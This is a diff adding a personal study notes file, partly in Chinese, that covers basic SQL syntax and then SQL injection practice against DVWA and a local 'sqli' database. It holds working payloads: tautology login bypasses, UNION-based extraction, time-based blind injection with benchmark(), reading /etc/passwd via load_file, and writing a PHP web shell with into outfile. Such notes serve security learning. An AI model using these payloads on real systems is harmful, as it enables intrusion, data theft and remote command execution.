@@ -1,0 +1,164 @@
+创建数据库 CREATE DATABASE database-name 
+删除数据库 drop database dbname 
+创建新表 
+create table tabname(col1 type1 [not null] [primary key],col2 type2 [not null],..) 
+删除新表：drop table tabname
+选择：select * from table1 where 范围 
+插入：insert into table1(field1,field2) values(value1,value2) 
+删除：delete from table1 where 范围 
+更新：update table1 set field1=value1 where 范围 
+查找：select * from table1 where field1 like ’%value1%’ ---like的语法很精妙，查资料! 
+排序：select * from table1 order by field1,field2 [desc] 
+总数：select count * as totalcount from table1 
+求和：select sum(field1) as sumvalue from table1 
+平均：select avg(field1) as avgvalue from table1 
+最大：select max(field1) as maxvalue from table1 
+最小：select min(field1) as minvalue from table1 
+
+select user();
+select current_user();
+select session_user();
+
+select database();
+
+
+sqli, user;
+
+select * from users where username='a';
+select * from users where username='a' and 1=1;
+select * from users where username='a' and 1=2;
+select * from users where username='a' or 1=2;
+select * from users where username='a' or 1=1;
+
+select 1 from user;
+select 1,2 from users;
+select 1,2,3,4 from users;
+
+
+benchmark(count,expr);
+select benchmark(100000,encode('hello','goodbye'));
+
+if
+if() then; else;
+
+select if(1,"insert into users (username,password) values('c','c')",null) from users as tble;
+
+select if(1,benchmark(1000000,encode("hello","goodbye")),null) from users;
+
+substring(string,m,n)
+
+select if(substring(current,1,1)='a',benchmark(1000000,encode("hello","good")),null) from (select database() as current) as t;
+
+into outfile
+
+select * from users into outfile '/home/jupiter/Desktop/sql/login/1.txt';
+
+
+
+loadfile
+
+select load_file("/home/jupiter/Desktop/h3llo");
+
+' union select 1, 2 into outfile"/home/jupiter/Desktop/sql/login/4.txt";#
+
+' union select 1, "hello" into outfile"/home/jupiter/Desktop/sql/login/5.txt";#
+
+' union select 1, "<?php phpinfo(); ?>" into outfile"/home/jupiter/Desktop/sql/login/5.php";#
+
+' union select 1, "<?php system($_GET[cmd]) ?>" into outfile"/home/jupiter/Desktop/sql/login/6.php";#
+
+
+ UNION 运算符 
+　　UNION 运算符通过组合其他两个结果表（例如 TABLE1 和 TABLE2）并消去表中任何重复行而派生出一个结果表。当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行。两种情况下，派生表的每一行不是来自 TABLE1 就是来自 TABLE2。 
+
+
+
+INFORMATION_SCHEMA提供了访问数据库元数据的方式。
+
+元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。
+
+select * ;
+
+show tables from information_schema;
+
+describe tables;
+
+select * form tables;
+
+select table_name from tables;
+
+
+select table_name from information_schema.tables where table_schema='sqli';
+
+
+
+
+
+
+dvwa:
+
+1' order by 2;#
+
+1' order by 3;# error!
+
+1' union select 1,2;#
+
+1' union select user(),database();#
+
+' union select 1, load_file('/etc/hostname');#
+
+' union select 1,2 into outfile '/tmp/a.txt' #
+
+
+
+select * from user where username='a' and password=PASSWORD("b");
+
+insert into user (username,password) values('c',SHA1('c'));
+
+
+
+
+' union select load_file('/etc/passwd');#
+
+a' union select 1,database();#
+
+a' union select 1, if(substring(current,1,1)='a',benchmark(1000000,encode("hello","good")),null) from (select database() as current) as t;#
+
+a' union select 1, if(substring(current,1,1)='s',benchmark (10000000,encode("hello","good")),null) from (select database () as current) as t; #
+
+select * from sqli.users where  ord(substring(user(),1,1))=114;
+
+ select * from users where username='a' or 1;#' and password='sss';
+
+select * from users where username='a' or '1'='1' and password='sss';
+
+ select * from users where username='a' and 1 or 0;
+
+select * from users where username='a' or 1 and 0;
+
+select * from users where username='a' or 0 and 0;
+
+(and has a higher priority)
+
+
+
+1' and exists(select * from users) --
+1' and exists(select 表名 from users) --
+
+select * from users where username='a' and exists(select * from user1);
+
+
+select * from user where username='a' and mid(user(),1,1)='r';
+
+select group_concat(table_name) from information_schema.tables where table_schema='sqli';
+
+http://www.AAA.com/jump.asp?id=3400 and  0<>(select  *
+from  master.dbo.sysdatabases  where  name>1  and  dbid=6)
+
+
+
+
+"$id$salt$hashed", the printable form of a password hash as produced by crypt (C), where "$id" is the algorithm used. (On GNU/Linux, "$1$" stands for MD5, "$2a$" is Blowfish, "$2y$" is Blowfish (correct handling of 8-bit chars), "$5$" is SHA-256 and "$6$" is SHA-512, crypt(3) manpage, other Unix may have different values, like NetBSD. Key stretching is used to increase password cracking difficulty, using by default 1000 rounds of modified MD5,[4] 64 rounds of Blowfish, 5000 rounds of SHA-256 or SHA-512.[5] The number of rounds may be varied for Blowfish, or for SHA-256 and SHA-512 by using e.g. "$6$rounds=50000$".)
+
+
+
